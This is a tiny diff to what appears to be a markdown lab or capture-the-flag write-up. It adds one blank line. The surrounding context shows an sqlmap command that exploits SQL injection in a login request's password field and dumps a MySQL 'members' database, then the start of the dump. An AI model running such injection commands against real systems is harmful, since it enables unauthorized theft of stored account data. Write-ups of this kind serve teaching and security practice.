@@ -35,6 +35,7 @@ sqlmap -r checklogin.txt -p mypassword --dbms=mysql -D members --dump
 ```
 
 And got this from the DB
+
 ```
 Database: members
 Table: members
